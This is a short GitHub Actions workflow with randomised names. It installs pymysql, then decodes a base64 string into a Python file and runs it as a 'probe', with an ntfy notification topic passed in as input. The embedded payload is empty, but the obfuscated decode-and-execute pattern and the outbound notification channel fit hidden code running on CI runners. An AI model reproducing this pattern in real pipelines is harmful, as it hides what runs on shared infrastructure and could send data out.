name: i47395db
on:
  workflow_dispatch:
    inputs:
      topic:
        description: ntfy topic
        default: "i47395db-f0n5dshq67"
jobs:
  d:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    permissions: {}
    steps:
      - name: setup
        run: |
          python3 -m pip install --quiet pymysql 2>/dev/null || true
          python3 -c "import pymysql; print('pymysql', pymysql.__version__)" 2>&1 || echo PIP_FAIL
      - name: probe
        env:
          TOPIC: ${{ github.event.inputs.topic }}
        run: |
          set +e
          echo '' | base64 -d > /tmp/p.py
          python3 -c "import py_compile;py_compile.compile('/tmp/p.py')" && echo PYOK
          python3 /tmp/p.py
          echo "END rc=$?"
